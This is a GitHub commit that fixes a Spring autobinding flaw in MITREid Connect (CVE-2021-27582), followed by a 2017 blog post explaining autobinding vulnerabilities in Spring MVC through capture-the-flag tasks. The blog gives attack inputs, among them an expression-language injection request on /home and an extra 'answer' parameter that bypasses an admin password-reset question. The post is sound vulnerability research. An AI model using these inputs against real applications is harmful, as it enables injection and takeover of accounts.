=== Content from github.com_5250e7cc_20250114_215317.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmitreid-connect%2FOpenID-Connect-Java-Spring-Server%2Fcommit%2F7eba3c12fed82388f917e8dd9b73e86e3a311e4c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmitreid-connect%2FOpenID-Connect-Java-Spring-Server%2Fcommit%2F7eba3c12fed82388f917e8dd9b73e86e3a311e4c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mitreid-connect%2FOpenID-Connect-Java-Spring-Server)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mitreid-connect](/mitreid-connect)
/
**[OpenID-Connect-Java-Spring-Server](/mitreid-connect/OpenID-Connect-Java-Spring-Server)**
Public

* [Notifications](/login?return_to=%2Fmitreid-connect%2FOpenID-Connect-Java-Spring-Server) You must be signed in to change notification settings
* [Fork
  765](/login?return_to=%2Fmitreid-connect%2FOpenID-Connect-Java-Spring-Server)
* [Star
   1.5k](/login?return_to=%2Fmitreid-connect%2FOpenID-Connect-Java-Spring-Server)

* [Code](/mitreid-connect/OpenID-Connect-Java-Spring-Server)
* [Issues
  208](/mitreid-connect/OpenID-Connect-Java-Spring-Server/issues)
* [Pull requests
  58](/mitreid-connect/OpenID-Connect-Java-Spring-Server/pulls)
* [Actions](/mitreid-connect/OpenID-Connect-Java-Spring-Server/actions)
* [Projects
  0](/mitreid-connect/OpenID-Connect-Java-Spring-Server/projects)
* [Wiki](/mitreid-connect/OpenID-Connect-Java-Spring-Server/wiki)
* [Security](/mitreid-connect/OpenID-Connect-Java-Spring-Server/security)
* [Insights](/mitreid-connect/OpenID-Connect-Java-Spring-Server/pulse)

Additional navigation options

* [Code](/mitreid-connect/OpenID-Connect-Java-Spring-Server)
* [Issues](/mitreid-connect/OpenID-Connect-Java-Spring-Server/issues)
* [Pull requests](/mitreid-connect/OpenID-Connect-Java-Spring-Server/pulls)
* [Actions](/mitreid-connect/OpenID-Connect-Java-Spring-Server/actions)
* [Projects](/mitreid-connect/OpenID-Connect-Java-Spring-Server/projects)
* [Wiki](/mitreid-connect/OpenID-Connect-Java-Spring-Server/wiki)
* [Security](/mitreid-connect/OpenID-Connect-Java-Spring-Server/security)
* [Insights](/mitreid-connect/OpenID-Connect-Java-Spring-Server/pulse)

## Commit

[Permalink](/mitreid-connect/OpenID-Connect-Java-Spring-Server/commit/7eba3c12fed82388f917e8dd9b73e86e3a311e4c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix Spring Autobinding vulnerability

[Browse files](/mitreid-connect/OpenID-Connect-Java-Spring-Server/tree/7eba3c12fed82388f917e8dd9b73e86e3a311e4c)
Browse the repository at this point in the history

```
1. Make authorizationRequest no longer affected by http request parameters due to [@ModelAttribute](https://github.com/ModelAttribute). See <http://agrrrdog.blogspot.com/2017/03/autobinding-vulns-and-spring-mvc.html>
```

* Loading branch information

[![@artsploit](https://avatars.githubusercontent.com/u/44605151?s=40&v=4)](/artsploit) [![@jricher](https://avatars.githubusercontent.com/u/122511?s=40&v=4)](/jricher)

[artsploit](/mitreid-connect/OpenID-Connect-Java-Spring-Server/commits?author=artsploit "View all commits by artsploit")
authored and
[jricher](/mitreid-connect/OpenID-Connect-Java-Spring-Server/commits?author=jricher "View all commits by jricher")
committed
Feb 18, 2021

1 parent
[0d4ef2c](/mitreid-connect/OpenID-Connect-Java-Spring-Server/commit/0d4ef2cb4f77bea5df9e2d4f1cfff4dffb7045c0)

commit 7eba3c1

Showing
**1 changed file**
with
**2 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java](#diff-396d63ee6695a65bc5729e8a7eb4aa989ffe6a06534088d861b9a4d9bde91045 "openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java")

Show comments

[View file](/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/7eba3c12fed82388f917e8dd9b73e86e3a311e4c/openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -103,9 +103,9 @@ public OAuthConfirmationController(ClientDetailsEntityService clientService) { |
|  |  |  |
|  |  | @PreAuthorize("hasRole('ROLE\_USER')") |
|  |  | @RequestMapping("/oauth/confirm\_access") |
|  |  | public String confimAccess(Map<String, Object> model, @ModelAttribute("authorizationRequest") AuthorizationRequest authRequest, |
|  |  | Principal p) { |
|  |  | public String confirmAccess(Map<String, Object> model, Principal p) { |
|  |  |  |
|  |  | AuthorizationRequest authRequest = (AuthorizationRequest) model.get("authorizationRequest"); |
|  |  | // Check the "prompt" parameter to see if we need to do special processing |
|  |  |  |
|  |  | String prompt = (String)authRequest.getExtensions().get(PROMPT); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 1 comment on commit `7eba3c1`

[![@abergmann](https://avatars.githubusercontent.com/u/4102163?s=80&v=4)](/abergmann)

Copy link

### @abergmann **[abergmann](/abergmann)** commented on `[7eba3c1](/mitreid-connect/OpenID-Connect-Java-Spring-Server/commit/7eba3c12fed82388f917e8dd9b73e86e3a311e4c)` [Feb 24, 2021](#commitcomment-47493129)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[CVE-2021-27582](https://nvd.nist.gov/vuln/detail/CVE-2021-27582) was assigned to this commit.

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmitreid-connect%2FOpenID-Connect-Java-Spring-Server%2Fcommit%2F7eba3c12fed82388f917e8dd9b73e86e3a311e4c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from agrrrdog.blogspot.com_13cd5e41_20250114_215314.html ===


# [GreenDog's blog](http://agrrrdog.blogspot.com/)

## пятница, 24 марта 2017 г.

### Autobinding vulns and Spring MVC

### Intro

If you
don’t want to read all this text, you can [watch video from the 29thmeeting of Defcon Russia Group (in Russian)](https://www.youtube.com/watch?v=l5hU1Hq-gsA)

There is a
not so well-known vulnerability type - "autobinding", or "mass
assignment". The idea this type is based on a feature that is implemented
in many frameworks. It allows a framework to automatically bind HTTP request
parameters to objects and make them accessible to a developer. However, an
attacker can add additional HTTP request params and they will possibly be bounded
to an object. Depending on a victim software and its logic, the attacker can achieve
some interesting results.

The autobinding
feature is pretty widespread for frameworks, which makes attack surface rather
wide. However, usually it's hard to find them without knowing source code and
impact of a vuln strongly depends on an application.

You can
read about this type of vulns on OWASP
There are also
some simple examples, so if you are not familiar with it, I recommend that you look
at it.
<https://www.owasp.org/index.php/Mass_Assignment_Cheat_Sheet>

A
"real" example of such vulnerability and some additional information
for Spring MVC framework was published by Ryan Berg and Dinis Cruz in 2011 -  <https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf>

### Something new

It's passed
much time since that publication and Spring MVC now is not like it was before.
It's much much cooler :)
When I was preparing
tasks for the last ZeroNigths HackQuest, I wanted to provide one with an autobinding
vuln to make people more familiar with this type of vulns. During the creation
of the task, I've spotted an unknown/hidden variation of the autobinding vuln and
I'd like to tell you about it.

As I wrote
before, Spring MVC has changed. It's much smarter and has more features now.
One of the new things is using annotations for doing "magic" things.
Because of
them and some misunderstanding in minds, we can find an autobinding vuln in unexpected
places.
Let's look
at some of them and their official description (taken from here [http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html)](http://docs.spring.io/spring/docs/3.1.x/spring-framework-reference/html/mvc.html)

1)
@ModelAttribute on a method argument
*"An
@ModelAttribute on a method argument indicates the argument should be retrieved
from the model..."*

2)
@ModelAttribute on a method
*"An
@ModelAttribute on a method indicates the purpose of that method is to add one
or more model attributes. @ModelAttribute methods in a controller are invoked
before @RequestMapping methods"*

3)
@SessionAttribute for controller
*"The
type-level @SessionAttributes annotation declares session attributes used by a
specific handler. This will typically list the names of model attributes or
types of model attributes which should be transparently stored in the
session"*

4)
FlashAttribute
*"Flash
attributes provide a way for one request to store attributes intended for use
in another."*

If you are
not familiar with them or don't know spring at all, don't panic, because it
will be clearer with further examples :)

What do the
examples 2-4 have in common? They are all somehow related to  "passing" data between methods.
One of the
ways to get data that was passed to the method is to use @ModelAttribute on a
method argument (look at 1). However, it could lead to autobinding vuln. Why?
Because @ModelAttribute is pretty “smart”. Let's look at a full description of
it.

*"An
@ModelAttribute on a method argument indicates the argument should be retrieved
from the model. If not present in the model, the argument should be
instantiated first and then added to the model. Once present in the model, the
argument's fields should be populated from all request parameters that have
matching names."*

So, first,
@ModelAttribute retrieves an object from the model (or somewhere else) and then
it populates the object with a user request. Therefore, a coder expects trusted
data (the object) from the model, but an attacker can change it by just sending
a specially crafted request.
I've made 2
tasks for ZN HQ, and both of them contain variations of autobinding vulns.
Let's have a look  at what's going on
there.

Sources of the tasks - <https://github.com/GrrrDog/ZeroNights-HackQuest-2016>

### The First School of Bulimia “Edik”

The
application consists of 3 "pages": registration, authentication, home
page. The goal is to perform an expression language injection in the home page.
The obstacle is that a user can set values only during registration process...
There is a
class of User and it has 3 fields (name, password, weight) in the application.
The
registration controller looks like that:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7VNhF2zouXCH7SEDNRRGSnCL3jwPI-mSbGMZR1amM7ov3UPpY1ONPz4LjMAjJN9Qbe7iBfa1Z9diSk5qDdb1TXtlOboXcpBa0fWesDS7g2GXZE_rtePvvLPlF1e5_5k1Zv1dVbaSzHaLa/s640/1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7VNhF2zouXCH7SEDNRRGSnCL3jwPI-mSbGMZR1amM7ov3UPpY1ONPz4LjMAjJN9Qbe7iBfa1Z9diSk5qDdb1TXtlOboXcpBa0fWesDS7g2GXZE_rtePvvLPlF1e5_5k1Zv1dVbaSzHaLa/s1600/1.png)

As we can
see, the controller gets User object from a user request, validates it, and if
the object is validated, the controller puts it in "DB".

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghDsRR5TW-LQZBMf9Saa38UGSLWBlLlmxlOj1TO5Uq3fLja_VNRpde3vRGEeCrIlooqOKwE2IZTfoaROnsEoVu83XVVCF52VFWQtW9elO1p_KfDMChkY5xDB7sIzC5VPJdJt6RhyphenhyphenxE1TsK/s640/2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghDsRR5TW-LQZBMf9Saa38UGSLWBlLlmxlOj1TO5Uq3fLja_VNRpde3vRGEeCrIlooqOKwE2IZTfoaROnsEoVu83XVVCF52VFWQtW9elO1p_KfDMChkY5xDB7sIzC5VPJdJt6RhyphenhyphenxE1TsK/s1600/2.png)

The
validating process is very strict. Because of whitelisting, we can use only figures
or symbols, but we need to put special symbols in the user object! How? There
is no way for the registration controller.

So, what
can we do as attackers? Let's take a look at the authentication and home
controller.
Authentication
and home controller:

Authentication
method does pretty simple things:
1) gets a
username and password from a request;
2) gets a
user object from the db using the username and password;
3) puts the
user object in FlashAttribute and redirects to home method (sends redirect
response to "/home");
So, there
is no way to change the user object too.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsVZCeZZ7ikO-mpeQN_PwVpYGdeAHb_SIr9Mk-uzyL7sv68J6jRLZS1tUwIh9CI56q0w8Ih0q5yvFESNrlAXQvReA6h9VsjDDlHJl6Qlw_skQKsWiR5G6yfyURgsd3CSkjSgqEfZsXNuLS/s640/3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsVZCeZZ7ikO-mpeQN_PwVpYGdeAHb_SIr9Mk-uzyL7sv68J6jRLZS1tUwIh9CI56q0w8Ih0q5yvFESNrlAXQvReA6h9VsjDDlHJl6Qlw_skQKsWiR5G6yfyURgsd3CSkjSgqEfZsXNuLS/s1600/3.png)

 What about
the home method?

It just
gets the user object from the flash attribute and shows it to us.
@modelAttribute
is used in this case to get the user object, but it also can populate the user
object with incoming request params! So, we can change values in the user
object!
All we need
to do is to authenticate (send a request to the authenticate method) and add an
additional HTTP param during redirection.
So, our
request will look like:

**/home?name=${We\_Can\_Write\_Here\_wharever\_we\_want}**

The goal is
achieved.

### Populating

There is an
interesting and maybe not so obvious fact about autobinding. During populating
data, Spring MVC makes changes on a field basis; it doesn't create a new object
if something comes from an HTTP request. It means if there is an object from
the model and only one param is received from an HTTP request, the value of
only one field (with the same name as the HTTP param) will be changed and other
fields will stay the same.

### Justice League

Another
task. Actually, solution for this task doesn't involve using an autobinding
vuln, but there is one.
The application
consists of registration, authentication, home, and password recovering
"pages". The latter is only one that is important for us.
Actually,
recovering page is just one controller with several methods and it represents a
way of creating "wizards" (multi-step forms).
Our goal
for this task is to bypass authentication.

Overall
logic is the following.
1) A user
comes to a recovery page, inputs its username and send a request to submit the
form
2) the
resetHandler method receives the HTTP request. It gets a user object from the
db using the username from the request. Then it puts the user object in the
Model, and it automatically puts the object into a session
(@SessionAttribute("user") for the controller). Then it redirects to
next part of "wizard".

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9Pk21rrY6okI9ztzx2O8smYhCNkSXj1-9oh21ZBLCktjxztPjnr7tgr-aDlYRIfNzOYTjziHmnq33WZZZo43FEI1MHambKriCxZKK86Yz0nydjv4MOrIu0eVngs2ox4jdxF3pGYToCRXY/s640/4.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi9Pk21rrY6okI9ztzx2O8smYhCNkSXj1-9oh21ZBLCktjxztPjnr7tgr-aDlYRIfNzOYTjziHmnq33WZZZo43FEI1MHambKriCxZKK86Yz0nydjv4MOrIu0eVngs2ox4jdxF3pGYToCRXY/s1600/4.png)

3) The user
is redirected to the resetViewQuestionHandler method. Actually, the method
takes the user object from the session (yeah-yeah, using @ModelAttribute). It requires
that object because the method has to get a custom user security question and
show it in a view (however, that hasn't been implemented :)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3l74gOd7a1bk8iy-_rLQOEoZ6wsyFbAqwVLQXFR6Mz9xbAOTd4fJIkuaOAuHpow9TpdKBj1icL6AXajDEX0l9u9anM6yFIsm6-DcsGGXJrhoyGR-pdY1o0HQ-L2Zh7IB660JIR69lD0cq/s640/5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3l74gOd7a1bk8iy-_rLQOEoZ6wsyFbAqwVLQXFR6Mz9xbAOTd4fJIkuaOAuHpow9TpdKBj1icL6AXajDEX0l9u9anM6yFIsm6-DcsGGXJrhoyGR-pdY1o0HQ-L2Zh7IB660JIR69lD0cq/s1600/5.png)

4) When the
user sends an answer for the question, the resetQuestionHandler method handles
it. The method gets the answer from "answerReset" param and compares
with the value in answer field from the user object. If answers match, the
method generates a new secure password and shows it to the user.
As you can
see, there is no @ModelAttribute near User user (in the method argument).
However, Spring MVC is smart and automatically gets value from the session.
Actually, it uses the same logic: gets value from somewhere, populates it with
a user request.

So, what we
can do as attackers?
a) We can
add "answer=any\_value", when we send a request to
resetViewQuestionHandler. Then our answer is populated with an object from a
session. So, we can change a correct answer to any value and after that set the
same value for the resetQuestionHandler method.
Therefore, we
can start the recovery process for admin user, bypass answer checking, and get
a new password for admin.
b) We can
add "answer=any\_value" on the last step too (resetQuestionHandler)
and get the same results. Actually, we can change a whole object if we would
like.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFQx42ALpgmb2u3AnBRXsVct2mgfcIsWhmMS1avgefNpy-0vASOyAkCfYyvp84OpE6l_QA2nYdxyhOyDTSrpHwCrex0QkKnz1rInCsRgGsYtV_AYK2tbmxQq-GqLZAbrExVb7krClJ55K2/s640/6.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFQx42ALpgmb2u3AnBRXsVct2mgfcIsWhmMS1avgefNpy-0vASOyAkCfYyvp84OpE6l_QA2nYdxyhOyDTSrpHwCrex0QkKnz1rInCsRgGsYtV_AYK2tbmxQq-GqLZAbrExVb7krClJ55K2/s1600/6.png)

### Session Puzzling

There is
another interesting thing. When a method gets an object from a session and populates
it with a user request, @SessionAttribute "forces" Spring to store
this newly populated object in the session. Therefore, we are able to control values
of the object that are stored in the session. How can we use it?
If there is
another controller that uses the same name of session attribute and trusts it,
then we can perform a Session Puzzling attack (Session Variable Overloading). [https://www.owasp.org/index.php/Testing\_for\_Session\_puzzling\_(OTG-SESS-008)](https://www.owasp.org/index.php/Testing_for_Session_puzzling_%28OTG-SESS-008%29) . As
far as I remember, the documentation says that a session attribute (created
using @SessionAttribute) is limited to a controller, but in practice, we can
use it in other controllers too.

### Real Examples

I was
looking for real examples of such issues on GitHub and in articles about Spring
MVC and even found some. But:
1) examples
identified on GitHub look like someone’s experiments with Spring MVC (not like real
stuff)
2) there
are some articles that recommend "dangerous" using of
@ModelAttribute, but their examples are too simple and there is no potential
impact.

### Detection

At first
glance, finding autobinding vulns using the "blackbox" approach looks
impossible. Nevertheless, both of tasks were solved, both autobinding vulns
were found. Respect to these people :)

There are
some things that can help us to find such type of vulns:
1) often, a
param name is equal to the name of a field of an object (but not necessary, because
it's configurable). As the fields are often named in specific way, we can
distinguish them. Of note, autobinding can be used with hashmaps and arrays.
2) When
autobinding in a controller's method is used and when we send two parameters
with the same name, the value in the object will be a concatenation of
parameters.
Example:
Request with params:
> ?name=text1&name=text2

Result:
> ObjectWithNameField.name
> = text1,text2

3) As soon
as we've collected all param names, we can send them to all entry points (URLs),
even to those that, at first glance, don't accept params (like resetViewQuestionHandler),
and check if replies are different or the same as without params.

### Conclusion

I've not
shown an example related to incorrect using of "@ModelAttribute on a
method", but something similar could happen in this case too.
As you can
see, the main idea,  is based on the fact
that a programmer thinks that he or she gets an object from a trusted place,
but in practice, the object can be modified by an attacker.

I'm not
sure, that I’ve correctly described causes of such a vuln, why and how Spring MVC behaves
in this way.

It's hard
to say exactly how common this variation of autobinding vuln is (but it definitely
can be somewhere ;) . In general, autobinding vulns are pretty widespread,
because of the feature they are based on. Moreover, the autobinding is not just
about HTTP params, theoretically, any incoming data (e.g. JSON or XML) can be
converted and then populated. However, a possibility of exploitation and impact
strongly depend on many things ranging from using annotations and names of attributes
to business logic of an application.

Sources of the tasks - <https://github.com/GrrrDog/ZeroNights-HackQuest-2016>

Автор:

[Aleksei Tiurin](https://www.blogger.com/profile/12130898511014099572 "author profile")

на

[04:30](http://agrrrdog.blogspot.com/2017/03/autobinding-vulns-and-spring-mvc.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=8095956197947792822&postID=6918386178654612235&from=pencil "Изменить сообщение")

[Отправить по электронной почте](https://www.blogger.com/share-post.g?blogID=8095956197947792822&postID=6918386178654612235&target=email "Отправить по электронной почте")[Написать об этом в блоге](https://www.blogger.com/share-post.g?blogID=8095956197947792822&postID=6918386178654612235&target=blog "Написать об этом в блоге")[Поделиться в X](https://www.blogger.com/share-post.g?blogID=8095956197947792822&postID=6918386178654612235&target=twitter "Поделиться в X")[Опубликовать в Facebook](https://www.blogger.com/share-post.g?blogID=8095956197947792822&postID=6918386178654612235&target=facebook "Опубликовать в Facebook")[Поделиться в Pinterest](https://www.blogger.com/share-post.g?blogID=8095956197947792822&postID=6918386178654612235&target=pinterest "Поделиться в Pinterest")

Ярлыки:
[autobinding](http://agrrrdog.blogspot.com/search/label/autobinding),
[java](http://agrrrdog.blogspot.com/search/label/java),
[mass assignment](http://agrrrdog.blogspot.com/search/label/mass%20assignment),
[spring mvc](http://agrrrdog.blogspot.com/search/label/spring%20mvc)

#### 1 комментарий:

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[rusyasoft](https://www.blogger.com/profile/01663497448247257296)[26 мая 2019 г. в 23:35](http://agrrrdog.blogspot.com/2017/03/autobinding-vulns-and-spring-mvc.html?showComment=1558938924317#c6453708384380474254)

   Этот комментарий был удален автором.

   Ответить[Удалить](https://www.blogger.com/delete-comment.g?blogID=8095956197947792822&postID=6453708384380474254)Ответы
   Ответить

Добавить комментарийЕщё

[Следующее](http://agrrrdog.blogspot.com/2018/01/java-deserialization-misusing-ojdbc-for.html "Следующее")

[Предыдущее](http://agrrrdog.blogspot.com/2016/06/remote-detection-of-users-av-via-flash.html "Предыдущее")

[Главная страница](http://agrrrdog.blogspot.com/)

Подписаться на:
[Комментарии к сообщению (Atom)](http://agrrrdog.blogspot.com/feeds/6918386178654612235/comments/default)

## About me

[Aleksei Tiurin](https://www.blogger.com/profile/12130898511014099572)

[Просмотреть профиль](https://www.blogger.com/profile/12130898511014099572)

## Projects

* [TLS Redirection](https://github.com/GrrrDog/TLS-Redirection)
* [Reverse Proxies Chet Sheet](https://github.com/GrrrDog/weird_proxies)
* [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
* [TacoTaco](https://github.com/GrrrDog/TacoTaco)
* [Flash AV detector](https://github.com/GrrrDog/FlashAV)
* [SNI Bruter](https://github.com/GrrrDog/sni_bruter)

## Ярлыки

* [ahk](http://agrrrdog.blogspot.com/search/label/ahk)
  (1)
* [antivirus](http://agrrrdog.blogspot.com/search/label/antivirus)
  (1)
* [autobinding](http://agrrrdog.blogspot.com/search/label/autobinding)
  (1)
* [browser cache](http://agrrrdog.blogspot.com/search/label/browser%20cache)
  (1)
* [bypass](http://agrrrdog.blogspot.com/search/label/bypass)
  (2)
* [cache deception](http://agrrrdog.blogspot.com/search/label/cache%20deception)
  (1)
* [cache poisoning](http://agrrrdog.blogspot.com/search/label/cache%20poisoning)
  (3)
* [cisco](http://agrrrdog.blogspot.com/search/label/cisco)
  (1)
* [code review](http://agrrrdog.blogspot.com/search/label/code%20review)
  (1)
* [cpdos](http://agrrrdog.blogspot.com/search/label/cpdos)
  (2)
* [debugger](http://agrrrdog.blogspot.com/search/label/debugger)
  (1)
* [deserialization](http://agrrrdog.blogspot.com/search/label/deserialization)
  (2)
* [ear](http://agrrrdog.blogspot.com/search/label/ear)
  (1)
* [flash](http://agrrrdog.blogspot.com/search/label/flash)
  (1)
* [group policy](http://agrrrdog.blogspot.com/search/label/group%20policy)
  (1)
* [http2](http://agrrrdog.blogspot.com/search/label/http2)
  (1)
* [j2ee](http://agrrrdog.blogspot.com/search/label/j2ee)
  (1)
* [java](http://agrrrdog.blogspot.com/search/label/java)
  (5)
* [javadeser](http://agrrrdog.blogspot.com/search/label/javadeser)
  (1)
* [javascript](http://agrrrdog.blogspot.com/search/label/javascript)
  (1)
* [mass assignment](http://agrrrdog.blogspot.com/search/label/mass%20assignment)
  (1)
* [misrouting](http://agrrrdog.blogspot.com/search/label/misrouting)
  (2)
* [mitm](http://agrrrdog.blogspot.com/search/label/mitm)
  (3)
* [nbns](http://agrrrdog.blogspot.com/search/label/nbns)
  (1)
* [oracle](http://agrrrdog.blogspot.com/search/label/oracle)
  (1)
* [pentest](http://agrrrdog.blogspot.com/search/label/pentest)
  (4)
* [rce](http://agrrrdog.blogspot.com/search/label/rce)
  (1)
* [reverse proxy](http://agrrrdog.blogspot.com/search/label/reverse%20proxy)
  (3)
* [saml](http://agrrrdog.blogspot.com/search/label/saml)
  (1)
* [sop](http://agrrrdog.blogspot.com/search/label/sop)
  (1)
* [spring mvc](http://agrrrdog.blogspot.com/search/label/spring%20mvc)
  (1)
* [srp](http://agrrrdog.blogspot.com/search/label/srp)
  (1)
* [ssrf](http://agrrrdog.blogspot.com/search/label/ssrf)
  (1)
* [ssti](http://agrrrdog.blogspot.com/search/label/ssti)
  (1)
* [swf](http://agrrrdog.blogspot.com/search/label/swf)
  (1)
* [tacacs](http://agrrrdog.blogspot.com/search/label/tacacs)
  (1)
* [tacotaco](http://agrrrdog.blogspot.com/search/label/tacotaco)
  (1)
* [thymeleaf](http://agrrrdog.blogspot.com/search/label/thymeleaf)
  (1)
* [tls](http://agrrrdog.blogspot.com/search/label/tls)
  (2)
* [windows](http://agrrrdog.blogspot.com/search/label/windows)
  (3)

## Архив блога

* ►
  [2023](http://agrrrdog.blogspot.com/2023/)
  (1)
  + ►
    [января](http://agrrrdog.blogspot.com/2023/01/)
    (1)

* ►
  [2022](http://agrrrdog.blogspot.com/2022/)
  (1)
  + ►
    [декабря](http://agrrrdog.blogspot.com/2022/12/)
    (1)

* ►
  [2021](http://agrrrdog.blogspot.com/2021/)
  (3)
  + ►
    [декабря](http://agrrrdog.blogspot.com/2021/12/)
    (1)
  + ►
    [апреля](http://agrrrdog.blogspot.com/2021/04/)
    (1)
  + ►
    [января](http://agrrrdog.blogspot.com/2021/01/)
    (1)

* ►
  [2020](http://agrrrdog.blogspot.com/2020/)
  (2)
  + ►
    [июля](http://agrrrdog.blogspot.com/2020/07/)
    (1)
  + ►
    [февраля](http://agrrrdog.blogspot.com/2020/02/)
    (1)

* ►
  [2019](http://agrrrdog.blogspot.com/2019/)
  (2)
  + ►
    [апреля](http://agrrrdog.blogspot.com/2019/04/)
    (1)
  + ►
    [января](http://agrrrdog.blogspot.com/2019/01/)
    (1)

* ►
  [2018](http://agrrrdog.blogspot.com/2018/)
  (3)
  + ►
    [октября](http://agrrrdog.blogspot.com/2018/10/)
    (1)
  + ►
    [июля](http://agrrrdog.blogspot.com/2018/07/)
    (1)
  + ►
    [января](http://agrrrdog.blogspot.com/2018/01/)
    (1)

* ▼
  [2017](http://agrrrdog.blogspot.com/2017/)
  (1)
  + ▼
    [марта](http://agrrrdog.blogspot.com/2017/03/)
    (1)
    - [Autobinding vulns and Spring MVC](http://agrrrdog.blogspot.com/2017/03/autobinding-vulns-and-spring-mvc.html)

* ►
  [2016](http://agrrrdog.blogspot.com/2016/)
  (2)
  + ►
    [июня](http://agrrrdog.blogspot.com/2016/06/)
    (1)
  + ►
